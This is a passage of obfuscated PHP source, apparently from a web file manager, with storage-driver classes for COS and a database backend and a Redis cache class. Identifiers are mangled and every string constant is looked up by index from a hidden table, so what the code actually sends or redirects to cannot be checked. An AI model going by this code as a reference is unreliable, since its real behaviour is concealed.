- 1]; if (!strstr($šÜÃÛÃº[0], $æ†¹†‡³[1320]) || !$´ç¤Ç”è) { continue; } $ÁÜ¥Ğğ = rtrim($´ç¤Ç”è, $æ†¹†‡³[8]) . $æ†¹†‡³[8]; if (in_array($ÁÜ¥Ğğ, $¯¹ÁšØË)) { continue; } $Úğ¬¦ã¤[] = $ÁÜ¥Ğğ; } return $Úğ¬¦ã¤; } public static function isSameDisk($Ø— ÁÊ, $ÔüèÆŠ¥) { $Áü‘ì‡Ú =& $_SERVER[ï»»·÷á]; if ($GLOBALS[$Áü‘ì‡Ú[6]][$Áü‘ì‡Ú[1306]] == $Áü‘ì‡Ú[1307]) { return strtolower(substr($Ø— ÁÊ, 0, 1)) == strtolower(substr($ÔüèÆŠ¥, 0, 1)); } $¯´Ÿ‹Á = self::diskList(); $›¨Ä©°ó = !1; $ï¯´•ç = !1; sort($¯´Ÿ‹Á); $¯´Ÿ‹Á = array_reverse($¯´Ÿ‹Á); $Ø— ÁÊ = rtrim($Ø— ÁÊ, $Áü‘ì‡Ú[8]) . $Áü‘ì‡Ú[8]; $ÔüèÆŠ¥ = rtrim($ÔüèÆŠ¥, $Áü‘ì‡Ú[8]) . $Áü‘ì‡Ú[8]; foreach ($¯´Ÿ‹Á as $µî£õƒ) { $„™Õ© = strlen($µî£õƒ); if (!$›¨Ä©°ó && substr($Ø— ÁÊ, 0, $„™Õ©) == $µî£õƒ) { $›¨Ä©°ó = $µî£õƒ; } if (!$ï¯´•ç && substr($ÔüèÆŠ¥, 0, $„™Õ©) == $µî£õƒ) { $ï¯´•ç = $µî£õƒ; } if ($›¨Ä©°ó && $ï¯´•ç) { break; } } return $›¨Ä©°ó === $ï¯´•ç; } public static function transferType($‚ŠëÅîÏ, $¹ªã…Øë) { $±¶¥ÆÔ =& $_SERVER[ï»»·÷á]; $›€Ó‹™° = self::driverType($‚ŠëÅîÏ); $âÛÙ—ø” = self::driverType($¹ªã…Øë); if ($›€Ó‹™°[$±¶¥ÆÔ[33]] == $âÛÙ—ø”[$±¶¥ÆÔ[33]] && $›€Ó‹™°[$±¶¥ÆÔ[1321]] == $âÛÙ—ø”[$±¶¥ÆÔ[1321]]) { return $±¶¥ÆÔ[1322]; } if ($›€Ó‹™°[$±¶¥ÆÔ[33]] == $±¶¥ÆÔ[881] && $âÛÙ—ø”[$±¶¥ÆÔ[33]] == $±¶¥ÆÔ[106]) { return $±¶¥ÆÔ[1204]; } if ($›€Ó‹™°[$±¶¥ÆÔ[33]] == $±¶¥ÆÔ[106] && $âÛÙ—ø”[$±¶¥ÆÔ[33]] == $±¶¥ÆÔ[881]) { return $±¶¥ÆÔ[107]; } return $±¶¥ÆÔ[1323]; } public static function driverType($ÜÏÙ”â) { $ÇÍ½ò¾Ù =& $_SERVER[ï»»·÷á]; $á€çêú« = str_replace($ÇÍ½ò¾Ù[1324], $ÇÍ½ò¾Ù[12], strtolower($ÜÏÙ”â->getType())); if ($á€çêú« == $ÇÍ½ò¾Ù[770] || $á€çêú« == $ÇÍ½ò¾Ù[1325] || $á€çêú« == $ÇÍ½ò¾Ù[1326]) { $ÜÏÙ”â = self::defaultDriverInit(); } else { if ($á€çêú« == $ÇÍ½ò¾Ù[1214] || $á€çêú« == $ÇÍ½ò¾Ù[1327]) { $ÜÏÙ”â = IO::init($ÜÏÙ”â->pathParse[$ÇÍ½ò¾Ù[1161]]); } } $Áà«ğÓª = $ÜÏÙ”â->path; $á€çêú« = str_replace($ÇÍ½ò¾Ù[1324], $ÇÍ½ò¾Ù[12], strtolower($ÜÏÙ”â->getType())); if ($á€çêú« == $ÇÍ½ò¾Ù[106]) { return array($ÇÍ½ò¾Ù[33] => $ÇÍ½ò¾Ù[106], $ÇÍ½ò¾Ù[1321] => $ÇÍ½ò¾Ù[12], $ÇÍ½ò¾Ù[84] => $Áà«ğÓª, $ÇÍ½ò¾Ù[95] => $ÜÏÙ”â); } return array($ÇÍ½ò¾Ù[33] => $ÇÍ½ò¾Ù[881], $ÇÍ½ò¾Ù[1321] => $ÜÏÙ”â->pathDriver, $ÇÍ½ò¾Ù[84] => $Áà«ğÓª, $ÇÍ½ò¾Ù[95] => $ÜÏÙ”â); } public static function pathDriverType($ßæ†¯ñ«) { return $ßæ†¯ñ« ? self::driverType(IO::init($ßæ†¯ñ«)) : !1; } public static function pathDriverLocal($ˆ—¢©) { $À×Òëö‡ =& $_SERVER[ï»»·÷á]; $ˆ‡‚ßåô = $ˆ—¢© ? self::driverType(IO::init($ˆ—¢©)) : !1; return $ˆ‡‚ßåô[$À×Òëö‡[33]] == $À×Òëö‡[106] ? !0 : !1; } public static function allowCover($ ²¢Ñµ, $íçä®µ = true) { $Æ’Ì˜¾ =& $_SERVER[ï»»·÷á]; if (is_string($ ²¢Ñµ)) { $ ²¢Ñµ = IO::info($ ²¢Ñµ); } if (!$ ²¢Ñµ || $ ²¢Ñµ[$Æ’Ì˜¾[33]] == $Æ’Ì˜¾[75] || $ ²¢Ñµ[$Æ’Ì˜¾[76]] <= 100) { return !1; } if (isset($ ²¢Ñµ[$Æ’Ì˜¾[1328]]) || !$ ²¢Ñµ[$Æ’Ì˜¾[84]]) { return !1; } if (isset($ ²¢Ñµ[$Æ’Ì˜¾[202]]) && !$ ²¢Ñµ[$Æ’Ì˜¾[202]]) { return $ ²¢Ñµ; } static $¦³Ş£§î = false; if (!$¦³Ş£§î || !$íçä®µ) { $ò–¬üÒÄ = self::driverType(IO::init($ ²¢Ñµ[$Æ’Ì˜¾[84]])); $¦«éşù´ = $ò–¬üÒÄ[$Æ’Ì˜¾[95]]; $¦³Ş£§î = $Æ’Ì˜¾[1329]; if ($ò–¬üÒÄ[$Æ’Ì˜¾[33]] == $Æ’Ì˜¾[106]) { $¦³Ş£§î = $Æ’Ì˜¾[1330]; } if ($ò–¬üÒÄ[$Æ’Ì˜¾[95]] && is_array($ò–¬üÒÄ[$Æ’Ì˜¾[95]]->config)) { $×ÔÜéï = $ò–¬üÒÄ[$Æ’Ì˜¾[95]]->config; if (isset($×ÔÜéï[$Æ’Ì˜¾[1331]]) && $×ÔÜéï[$Æ’Ì˜¾[1331]]) { $¦³Ş£§î = $Æ’Ì˜¾[1330]; } } } return $¦³Ş£§î == $Æ’Ì˜¾[1330] ? !0 : !1; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($ÊÔÀâ¥“) { parent::__construct($ÊÔÀâ¥“); $this->signatureVersion($_SERVER[ï»»·÷á][216]); } public function uploadFormData($ÁÒÌ¨›Ö, $„„à÷‘³ = 3600) { $İó…»¡è =& $_SERVER[ï»»·÷á]; $–üæÉ¯¯ = $İó…»¡è[199]; $¼â¿Ó¾ = $İó…»¡è[232]; $Ö¹¤Üİ“ = $İó…»¡è[1332]; $ªÏùî¨’ = gmdate($İó…»¡è[1333], time() + $„„à÷‘³); $ïöÆ‘ò² = (string) time() . $İó…»¡è[71] . (string) (time() + $„„à÷‘³); $œş÷îÔî = array($İó…»¡è[1334] => $ªÏùî¨’, $İó…»¡è[1335] => array(array($İó…»¡è[1336] => $–üæÉ¯¯), array($İó…»¡è[1337] => $this->bucket), array($İó…»¡è[1338], $İó…»¡è[1339], $İó…»¡è[12]), array($İó…»¡è[1340] => $Ö¹¤Üİ“), array($İó…»¡è[1341] => $¼â¿Ó¾), array($İó…»¡è[1342] => $this->accessKey), array($İó…»¡è[1343] => $ïöÆ‘ò²))); $œş÷îÔî = json_encode($œş÷îÔî); $ÕñØ‡– = hash_hmac($İó…»¡è[232], $ïöÆ‘ò², $this->secret); $çÒš¼‰ = sha1($œş÷îÔî); $ÕÙÕÓ°ú = hash_hmac($İó…»¡è[232], $çÒš¼‰, $ÕñØ‡–); $ú†¼½™‚ = array($İó…»¡è[1336] => $–üæÉ¯¯, $İó…»¡è[1340] => $Ö¹¤Üİ“, $İó…»¡è[1344] => base64_encode($œş÷îÔî), $İó…»¡è[1341] => $¼â¿Ó¾, $İó…»¡è[1342] => $this->accessKey, $İó…»¡è[1345] => $ïöÆ‘ò², $İó…»¡è[1346] => $ÕÙÕÓ°ú, $İó…»¡è[182] => $this->getHost()); return $ú†¼½™‚; } public function fileOutLink($¶Ÿó“Ï¹) { $ûö–·ã =& $_SERVER[ï»»·÷á]; if (substr($¶Ÿó“Ï¹, 0, 7) == $ûö–·ã[1347]) { $¶Ÿó“Ï¹ = $ûö–·ã[1348] . substr($¶Ÿó“Ï¹, 7); } header($ûö–·ã[161] . $¶Ÿó“Ï¹); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($¬·ÑãËó) { $this->pathParse = $¬·ÑãËó; $this->model = Model($_SERVER[ï»»·÷á][1349]); } public function getPath($‡¬Şå¸¶) { return trim($‡¬Şå¸¶, $_SERVER[ï»»·÷á][8]); } public function pathFather($ÄÂéäÚ) { $şŞ‰¡ùó = $this->parse($ÄÂéäÚ); $şŞ‰¡ùó = $this->infoSimple($ÄÂéäÚ); return $şŞ‰¡ùó ? $şŞ‰¡ùó[$_SERVER[ï»»·÷á][441]] : !1; } public function pathThis($ä¹—éÊ•) { $¯é‹å™„ = $this->infoSimple($ä¹—éÊ•); return $¯é‹å™„ ? $¯é‹å™„[$_SERVER[ï»»·÷á][32]] : !1; } public function getPathOuter($ÖÓ£îàˆ) { if (!$ÖÓ£îàˆ) { return $ÖÓ£îàˆ; } $Ú“Åª² = $this->parse($ÖÓ£îàˆ); return KodIO::make($Ú“Åª²[$_SERVER[ï»»·÷á][399]]); } public function copyFolderFromIO($„ë€Ê¤Æ, $‡ä¬ÈŒî, $Ì÷­ŠÚ¸, $ÔÜ½İÅ, $¬‰¦Æ€) { $à‚€ú¥ = $this->model->copyFolderFromIO($„ë€Ê¤Æ, $‡ä¬ÈŒî, $Ì÷­ŠÚ¸, $ÔÜ½İÅ, $¬‰¦Æ€); return KodIO::make($à‚€ú¥); } public function isParentOf($©ÑïĞñå, $ãóôó²Ç) { return $this->model->isParentOf($©ÑïĞñå, $ãóôó²Ç); } public function mkfile($²ÅüŒïı, $ãéıú‰ñ = '', $º¸ê«— = REPEAT_RENAME) { $×Ş£ØÅØ =& $_SERVER[ï»»·÷á]; $–­Ÿ²ªå = $this->parse($²ÅüŒïı); $²ÅüŒïı = $–­Ÿ²ªå[$×Ş£ØÅØ[399]]; for ($Üóó = 0; $Üóó < count($–­Ÿ²ªå[$×Ş£ØÅØ[1350]]); $Üóó++) { $ı…–•¹¦ = $–­Ÿ²ªå[$×Ş£ØÅØ[1350]][$Üóó]; if ($Üóó == count($–­Ÿ²ªå[$×Ş£ØÅØ[1350]]) - 1) { $²ÅüŒïı = $this->model->mkfile($²ÅüŒïı, $ı…–•¹¦, $ãéıú‰ñ, $º¸ê«—); break; } $²ÅüŒïı = $this->model->mkdir($²ÅüŒïı, $ı…–•¹¦, REPEAT_SKIP); } return $this->getPathOuter($²ÅüŒïı); } public function mkdir($õ¶ÒáË†, $¡­Á£–œ = REPEAT_SKIP) { $°¿íÜ”š =& $_SERVER[ï»»·÷á]; $Î‹Öã¯§ = $this->parse($õ¶ÒáË†); $õ¶ÒáË† = $Î‹Öã¯§[$°¿íÜ”š[399]]; for ($Ê´×¼Î = 0; $Ê´×¼Î < count($Î‹Öã¯§[$°¿íÜ”š[1350]]); $Ê´×¼Î++) { $»Úïóò§ = $Î‹Öã¯§[$°¿íÜ”š[1350]][$Ê´×¼Î]; $õ¶ÒáË† = $this->model->mkdir($õ¶ÒáË†, $»Úïóò§, $¡­Á£–œ); } return $this->getPathOuter($õ¶ÒáË†); } public function copyFile($ƒá¢‹ñ, $Èú¯§, $ÎÖ©ÆŒ¦ = REPEAT_REPLACE) { $©ï¤õ¹› =& $_SERVER[ï»»·÷á]; $îº¬”é£ = $this->parse($Èú¯§); $Â‘­şÈ„ = $this->model->copy($ƒá¢‹ñ, $îº¬”é£[$©ï¤õ¹›[399]], $ÎÖ©ÆŒ¦, $îº¬”é£[$©ï¤õ¹›[84]]); return $Â‘­şÈ„ ? $this->getPathOuter($Â‘­şÈ„) : !1; } public function moveFile($ôğÌ½™Î, $Ò¨Ì‹ö, $øÉÇæ±ı = REPEAT_REPLACE) { $„ßß¯ö =& $_SERVER[ï»»·÷á]; $®‹ç†•Š = $this->parse($Ò¨Ì‹ö); $¶ùÌ§´Õ = $this->model->move($ôğÌ½™Î, $®‹ç†•Š[$„ßß¯ö[399]], $øÉÇæ±ı, $®‹ç†•Š[$„ßß¯ö[84]]); return $¶ùÌ§´Õ ? $this->getPathOuter($¶ùÌ§´Õ) : !1; } public function copy($€ıÒÆŒí, $²ñ€º¯, $€ğ˜ÀêÌ = REPEAT_REPLACE, $ÓóÍ—œÅ = false) { $œÔ¶ô”Í = $this->parse($²ñ€º¯); $«ô¯¸¾ = $this->model->copy($€ıÒÆŒí, $œÔ¶ô”Í[$_SERVER[ï»»·÷á][399]], $€ğ˜ÀêÌ, $ÓóÍ—œÅ); return $«ô¯¸¾ ? $this->getPathOuter($«ô¯¸¾) : !1; } public function moveSameAllow() { } public function move($µâ•Ø‹ , $¹ÂÃæü‰, $ç˜õ¥¼Ô = REPEAT_REPLACE, $»üúÖŠå = false) { $ö™ÀÙ° = $this->parse($¹ÂÃæü‰); $ëø’ãğ = $this->model->move($µâ•Ø‹ , $ö™ÀÙ°[$_SERVER[ï»»·÷á][399]], $ç˜õ¥¼Ô, $»üúÖŠå); return $ëø’ãğ ? $this->getPathOuter($ëø’ãğ) : !1; } public function remove($şÏßà’, $Ì¬ªß…” = true) { return $this->model->remove($şÏßà’, $Ì¬ªß…”); } public function rename($Ò€­š‘‚, $®ñ’×ûÒ) { $„®Ñ™î = $this->model->rename($Ò€­š‘‚, $®ñ’×ûÒ); return $„®Ñ™î ? $this->getPathOuter($Ò€­š‘‚) : $„®Ñ™î; } public function size($Ş˜Ñ) { $é´Õõ½† = $this->infoSimple($Ş˜Ñ); return $é´Õõ½† ? $é´Õõ½†[$_SERVER[ï»»·÷á][76]] : 0; } public function infoSimple($ø›¸) { return $this->model->sourceInfo($ø›¸); } public function info($µğÇ˜³´) { return $this->infoParse($µğÇ˜³´); } public function infoAuth($ªºÃºÎ§) { return $this->infoParse($ªºÃºÎ§, !1, !0); } public function infoWithChildren($ê•óœ¹‚) { return $this->infoParse($ê•óœ¹‚, !0); } protected function infoParse($ıî—Í½, $©±æ˜ïà = false, $…Ú•ğ…Ù = false) { if (!$©±æ˜ïà) { return $this->model->pathInfo($ıî—Í½, $…Ú•ğ…Ù); } return $this->model->pathInfoMore($ıî—Í½); } public function infoFull($™Ù‹¼Úå) { $ğ¬üè‘— =& $_SERVER[ï»»·÷á]; $’æ® øï = explode($ğ¬üè‘—[8], $™Ù‹¼Úå); $€”’«…š = implode($ğ¬üè‘—[8], array_splice($’æ® øï, 1)); return $this->model->pathInfoByPath($’æ® øï[0], $€”’«…š); } public function hashSimple($¶õ˜šà´) { $ùû‘Ô™à =& $_SERVER[ï»»·÷á]; $¥Ú“Š¦Õ = $this->infoWithChildren($¶õ˜šà´); return $¥Ú“Š¦Õ[$ùû‘Ô™à[170]][$ùû‘Ô™à[177]]; } public function hashMd5($Îôò±¦ø) { $†²›ŠË× =& $_SERVER[ï»»·÷á]; $Öæ‘İõ = $this->infoWithChildren($Îôò±¦ø); return $Öæ‘İõ[$†²›ŠË×[170]][$†²›ŠË×[176]]; } public function exist($ğÄ×ıÙ–) { $‰¾Œ”¦² =& $_SERVER[ï»»·÷á]; $ıóŞ•úƒ = $this->parse($ğÄ×ıÙ–); if (!$ıóŞ•úƒ[$‰¾Œ”¦²[84]]) { return $this->isFile($ğÄ×ıÙ–) || $this->isFolder($ğÄ×ıÙ–); } $´œ–…éĞ = array($‰¾Œ”¦²[410] => $ıóŞ•úƒ[$‰¾Œ”¦²[399]], $‰¾Œ”¦²[32] => $ıóŞ•úƒ[$‰¾Œ”¦²[84]]); $¦“­ÚúÅ = $this->model->where($´œ–…éĞ)->find(); return $¦“­ÚúÅ ? !0 : !1; } public function isFile($íæŞ‡èµ) { $â§Üû¶Æ =& $_SERVER[ï»»·÷á]; $¿¦ÇáŸ¿ = $this->infoSimple($íæŞ‡èµ); return $¿¦ÇáŸ¿ && $¿¦ÇáŸ¿[$â§Üû¶Æ[419]] == $â§Üû¶Æ[88] ? !1 : !0; } public function isFolder($¥Êğ¿»²) { $€˜ºêØ =& $_SERVER[ï»»·÷á]; $‘¶›à™õ = $this->infoSimple($¥Êğ¿»²); return $‘¶›à™õ && $‘¶›à™õ[$€˜ºêØ[419]] == $€˜ºêØ[88] ? !0 : !1; } public function listPath($Á±Û¸‘, $Ç¾á”ü® = false) { $ŠĞ€ñ« =& $_SERVER[ï»»·÷á]; if ($Á±Û¸‘ == $ŠĞ€ñ«[12]) { return !1; } $Âı¾·ø¼ = array($ŠĞ€ñ«[410] => $Á±Û¸‘); if ($Ç¾á”ü®) { return $this->model->listSource($Âı¾·ø¼, -1); } return $this->model->listSource($Âı¾·ø¼); } public function has($Ôçƒ×, $÷ä—»Ø± = false, $»›ùâğ = null) { $®ÀÌ“ç€ =& $_SERVER[ï»»·÷á]; $İÇ÷¼”å = $this->infoWithChildren($Ôçƒ×); if ($÷ä—»Ø±) { return array($®ÀÌ“ç€[208] => $İÇ÷¼”å[$®ÀÌ“ç€[208]], $®ÀÌ“ç€[207] => $İÇ÷¼”å[$®ÀÌ“ç€[207]]); } return $»›ùâğ ? $İÇ÷¼”å[$®ÀÌ“ç€[208]] : $İÇ÷¼”å[$®ÀÌ“ç€[207]]; } public function listAll($õùï›ŠÂ) { $ãå§ëŞ˜ = IO::info($this->pathParse[$_SERVER[ï»»·÷á][84]]); if (!$ãå§ëŞ˜) { return array(); } return $this->model->listAll($õùï›ŠÂ); } public function getContent($‰òæ©æÃ) { return $this->model->getContent($‰òæ©æÃ); } public function setContent($¡¾­­šµ, $‰­İô¾Ù = '') { return $this->model->setContent($¡¾­­šµ, $‰­İô¾Ù); } public function fileSubstr($•ä•Û’, $†«•Ö¦ø, $Û”êµçâ) { return $this->model->fileSubstr($•ä•Û’, $†«•Ö¦ø, $Û”êµçâ); } public function download($Æ÷ÆØ™, $çÓ·‹¿¤ = '') { $çı­™í™ = get_path_father($çÓ·‹¿¤); $Åõ«µ ‘ = get_path_this($çÓ·‹¿¤); $é ĞğÊ½ = $this->model->fileInfoGet($Æ÷ÆØ™); $ûø“÷Ù± = IO::copy($é ĞğÊ½[$_SERVER[ï»»·÷á][84]], $çı­™í™, !1, $Åõ«µ ‘); return $ûø“÷Ù±; } public function setModifyTime($îŠæ¾Òæ, $èµ‚ãÂÓ = '') { $ºµäèñ =& $_SERVER[ï»»·÷á]; if (!$îŠæ¾Òæ) { return; } $this->model->where(array($ºµäèñ[426] => $îŠæ¾Òæ))->save(array($ºµäèñ[85] => $èµ‚ãÂÓ)); } public function upload($À©¼ß‡ü, $‹Ì«…°”, $Æ¢Æ¡¢ = false, $«¹Ì‘¥¤ = REPEAT_REPLACE) { $šß…‡ÏÑ =& $_SERVER[ï»»·÷á]; $®Ã’¯– = $this->parse($À©¼ß‡ü); $ò‰º­½« = $this->model->addFile($®Ã’¯–[$šß…‡ÏÑ[399]], $‹Ì«…°”, $®Ã’¯–[$šß…‡ÏÑ[84]], $Æ¢Æ¡¢, $«¹Ì‘¥¤); return $this->getPathOuter($ò‰º­½«); } public function uploadFileByID($‡¥º‚¦€, $Â²ì“–», $ªÜß•²Ô) { $©áˆÛ‘¤ =& $_SERVER[ï»»·÷á]; $—§éÆ¾Œ = $this->parse($‡¥º‚¦€); $Ò„áã¬î = $this->model->addFileByFileID($—§éÆ¾Œ[$©áˆÛ‘¤[399]], $Â²ì“–», $—§éÆ¾Œ[$©áˆÛ‘¤[84]], $ªÜß•²Ô); return $this->getPathOuter($Ò„áã¬î); } public function addFileByRemote($‚Ë–æ¤, $‰ü¸ˆ¸, $ÀˆŠŞâ— = array(), $€ ¤ˆè = '', $–Áç§”) { $Ğó…¿Ã‡ =& $_SERVER[ï»»·÷á]; $Ëæ³ò—ñ = $this->parse($‚Ë–æ¤); $€ ¤ˆè = empty($€ ¤ˆè) ? $Ëæ³ò—ñ[$Ğó…¿Ã‡[84]] : $€ ¤ˆè; $²ı¥Ãàµ = $this->model->addFileByRemote($Ëæ³ò—ñ[$Ğó…¿Ã‡[399]], $‰ü¸ˆ¸, $€ ¤ˆè, $ÀˆŠŞâ—, $–Áç§”); return $this->getPathOuter($²ı¥Ãàµ); } public function uploadLink($¹¾®îèÍ, $ ×ßÌÆ˜ = 0) { $¶Îš·¶µ =& $_SERVER[ï»»·÷á]; $ÔÑ—óä = $this->parse($¹¾®îèÍ); $©»”­×“ = _get($GLOBALS[$¶Îš·¶µ[7]], $¶Îš·¶µ[1351]); $¢Âè’¸ = _get($GLOBALS[$¶Îš·¶µ[7]], $¶Îš·¶µ[1352]); $¹¾®îèÍ = Model($¶Îš·¶µ[610])->createFileName($ÔÑ—óä[$¶Îš·¶µ[84]], $©»”­×“, $¢Âè’¸); return IO::uploadLink($¹¾®îèÍ, $ ×ßÌÆ˜); } public function fileNameAuto($Ë€¤Î¢„, $×˜¹¥§£, $–“³ó”¦ = REPEAT_REPLACE, $“Äç¯¶ = false) { return $this->model->fileNameAuto($Ë€¤Î¢„, $×˜¹¥§£, $–“³ó”¦, $“Äç¯¶); } public function fileNameExist($æëæ—”, $‰Òá²›«) { return $this->model->fileNameExist($æëæ—”, $‰Òá²›«); } protected function _fileOut($¬ÁÃÜ …, $Ä„‘¨®º = false, $í³¸ú£ = false, $¥»‡»¶’ = '', $µı„İ × = false) { $óŸçí€ =& $_SERVER[ï»»·÷á]; $å•ì´ŒÇ = $this->model->sourceInfo($¬ÁÃÜ …); if ($å•ì´ŒÇ[$óŸçí€[419]] == $óŸçí€[88]) { header($óŸçí€[1353]); die; } $§İ¤¬Èö = $this->model->fileInfoGet($¬ÁÃÜ …); $¥»‡»¶’ = $§İ¤¬Èö[$óŸçí€[176]] ? $§İ¤¬Èö[$óŸçí€[176]] : $¥»‡»¶’; $¬ö‰çŒÆ = isset($GLOBALS[$óŸçí€[1354]]) ? $GLOBALS[$óŸçí€[1354]] : $å•ì´ŒÇ[$óŸçí€[32]]; if ($µı„İ ×) { return IO::fileOutServer($§İ¤¬Èö[$óŸçí€[84]], $Ä„‘¨®º, $¬ö‰çŒÆ, $¥»‡»¶’); } IO::fileOut($§İ¤¬Èö[$óŸçí€[84]], $Ä„‘¨®º, $¬ö‰çŒÆ, $¥»‡»¶’); } public function fileOut($°“­†¸¨, $ã©Û¾” = false, $•»Õş“¯ = false, $Ì£™á× = '') { $this->_fileOut($°“­†¸¨, $ã©Û¾”, $•»Õş“¯, $Ì£™á×); } public function fileOutServer($Œ¾²æÏ•, $¼ù“ôœ¦ = false, $½Ğö…Æô = false, $µµÈ•‡ = '') { $this->_fileOut($Œ¾²æÏ•, $¼ù“ôœ¦, $½Ğö…Æô, $µµÈ•‡, !0); } protected function _fileOutImage($€œöÉî×, $Ü‚¾Ú›¾ = 250) { $Ä‹´˜åÏ =& $_SERVER[ï»»·÷á]; $ëŒí ‘ï = $this->model->pathInfo($€œöÉî×); if ($ëŒí ‘ï[$Ä‹´˜åÏ[419]] == $Ä‹´˜åÏ[88]) { show_json($Ä‹´˜åÏ[1355] . $€œöÉî×, !1); } $¤µåÕ´ = $this->model->fileInfoGet($€œöÉî×); $¤µåÕ´[$Ä‹´˜åÏ[32]] = $ëŒí ‘ï[$Ä‹´˜åÏ[32]]; $¤µåÕ´[$Ä‹´˜åÏ[169]] = $ëŒí ‘ï[$Ä‹´˜åÏ[169]]; $GLOBALS[$Ä‹´˜åÏ[1354]] = $¤µåÕ´[$Ä‹´˜åÏ[32]]; $GLOBALS[$Ä‹´˜åÏ[168]] = $¤µåÕ´; IO::fileOutImage($¤µåÕ´[$Ä‹´˜åÏ[84]], $Ü‚¾Ú›¾); } public function fileOutImage($¡Í¡¢§ë, $‘›ƒî¼ = 250) { $this->_fileOutImage($¡Í¡¢§ë, $‘›ƒî¼); } public function fileOutImageServer($Å›ª»¾Å, $êîë±‡ˆ = 250) { $this->_fileOutImage($Å›ª»¾Å, $êîë±‡ˆ); } public function link($Àä÷Â×Ÿ, $‘úíæß¡ = '') { $Ö°À“®î = $this->model->fileInfoGet($Àä÷Â×Ÿ); return IO::link($Ö°À“®î[$_SERVER[ï»»·÷á][84]], $‘úíæß¡); } protected function parse($áÄ¥ŒùÚ) { $ƒáÃëêÓ =& $_SERVER[ï»»·÷á]; if (strstr($áÄ¥ŒùÚ, $ƒáÃëêÓ[8]) === !1) { return array($ƒáÃëêÓ[428] => intval($áÄ¥ŒùÚ), $ƒáÃëêÓ[84] => $ƒáÃëêÓ[12], $ƒáÃëêÓ[1350] => array()); } $ş˜×ÀÚ = explode($ƒáÃëêÓ[8], trim($áÄ¥ŒùÚ, $ƒáÃëêÓ[8])); if (count($ş˜×ÀÚ) < 2) { show_tips(clear_html($áÄ¥ŒùÚ) . $ƒáÃëêÓ[1356]); } return array($ƒáÃëêÓ[428] => intval($ş˜×ÀÚ[0]), $ƒáÃëêÓ[84] => $ş˜×ÀÚ[1], $ƒáÃëêÓ[1350] => array_slice($ş˜×ÀÚ, 1)); } } goto fÀ»àí¹ëƒ; AÎ––È›ÇÕ: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($Š¯²ÇçÖ, $ñ¯±Ï·ã) { $ìïıîš =& $_SERVER[ï»»·÷á]; if (!class_exists($ìïıîš[882])) { show_json($ìïıîš[883], !1); } $this->cacheTime = $ñ¯±Ï·ã; $í±×÷¹³ = isset($Š¯²ÇçÖ[$ìïıîš[884]]) ? $Š¯²ÇçÖ[$ìïıîš[884]] : 10; $å¯ÛØ‹ç = _get($Š¯²ÇçÖ, $ìïıîš[881]); if ($å¯ÛØ‹ç && is_array($å¯ÛØ‹ç)) { $this->initCluster($Š¯²ÇçÖ, $í±×÷¹³); } else { $this->handle = $this->init($Š¯²ÇçÖ, $í±×÷¹³); } } private function init($åäœ™ˆÂ, $ÙÈëüıÆ) { $æÎóŒüœ =& $_SERVER[ï»»·÷á]; $ÅÓ¤ğœ– = new Redis(); $÷šÍº—â = isset($åäœ™ˆÂ[$æÎóŒüœ[885]]) ? $åäœ™ˆÂ[$æÎóŒüœ[885]] : !1; if ($÷šÍº—â) { $ÅÓ¤ğœ–->pconnect($åäœ™ˆÂ[$æÎóŒüœ[182]], $åäœ™ˆÂ[$æÎóŒüœ[183]], $ÙÈëüıÆ); } else { $ÅÓ¤ğœ–->connect($åäœ™ˆÂ[$æÎóŒüœ[182]], $åäœ™ˆÂ[$æÎóŒüœ[183]], $ÙÈëüıÆ); } if (!empty($åäœ™ˆÂ[$æÎóŒüœ[422]])) { $ÅÓ¤ğœ–->auth($åäœ™ˆÂ[$æÎóŒüœ[422]]); } if (!empty($åäœ™ˆÂ[$æÎóŒüœ[770]]) && $åäœ™ˆÂ[$æÎóŒüœ[770]] != 0) { $ÅÓ¤ğœ–->select($åäœ™ˆÂ[$æÎóŒüœ[770]]); } return $ÅÓ¤ğœ–; } private function initCluster($äòº‡, $åŠÆè) { $ôÃ¾¿’ï =& $_SERVER[ï»»·÷á]; $—‹¸Ø = array($ôÃ¾¿’ï[886], $ôÃ¾¿’ï[887], $ôÃ¾¿’ï[888]); $òùÁ»Ÿø = $ôÃ¾¿’ï[886]; if (isset($äòº‡[$ôÃ¾¿’ï[16]]) && in_array($äòº‡[$ôÃ¾¿’ï[16]], $—‹¸Ø)) { $òùÁ»Ÿø = $äòº‡[$ôÃ¾¿’ï[16]]; } switch ($òùÁ»Ÿø) { case $ôÃ¾¿’ï[886]: $this->_slave($äòº‡, $åŠÆè); break; case $ôÃ¾¿’ï[887]: break; case $ôÃ¾¿’ï[888]: $this->isCluster = !0; $û˜™ş×„ = $äòº‡[$ôÃ¾¿’ï[881]]; $ª‰¤Õ¾ = isset($äòº‡[$ôÃ¾¿’ï[885]]) ? $äòº‡[$ôÃ¾¿’ï[885]] : !1; $÷ù‘×Ä = isset($äòº‡[$ôÃ¾¿’ï[422]]) ? $äòº‡[$ôÃ¾¿’ï[422]] : null; $this->handle = new RedisCluster(NUll, $û˜™ş×„, $åŠÆè, $åŠÆè, $ª‰¤Õ¾, $÷ù‘×Ä); break; default: break; } } private function _slave($Êêš¨½×, $ßâÛíÀÎ) { $ò³ùÃ” = $Êêš¨½×[$_SERVER[ï»»·÷á][881]]; $this->filterConfig($Êêš¨½×, $ò³ùÃ”[0]); $this->handle = $this->init($Êêš¨½×, $ßâÛíÀÎ); unset($ò³ùÃ”[0]); if (empty($ò³ùÃ”)) { return; } $ìô’§Ÿ = array_rand($ò³ùÃ”); $this->filterConfig($Êêš¨½×, $ò³ùÃ”[$ìô’§Ÿ]); $this->slaveHandle = $this->init($Êêš¨½×, $ßâÛíÀÎ); } private function filterConfig(&$Ş©ŞÂà‰, $öŠ­ğé») { $É±Éäœ =& $_SERVER[ï»»·÷á]; $è‰„Ó¸Ÿ = explode($É±Éäœ[4], $öŠ­ğé»); $›¨Ùğ‰ú = array($É±Éäœ[182] => $è‰„Ó¸Ÿ[0], $É±Éäœ[183] => $è‰„Ó¸Ÿ[1]); $Ş©ŞÂà‰ = array_merge($Ş©ŞÂà‰, $›¨Ùğ‰ú); } public function set($Í¦üÕ, $Â…ô†œÎ, $ØˆÁ÷  = false) { $ØˆÁ÷  = $ØˆÁ÷  ? $ØˆÁ÷  : $this->cacheTime; return $this->handle->setEx($Í¦üÕ, $ØˆÁ÷ , $Â…ô†œÎ); } public function setLock($ÒÚ…Şò×, $€€úğ¨†, $öµª²«è) { return $this->handle->setNX($ÒÚ…Şò×, $€€úğ¨†); } public function 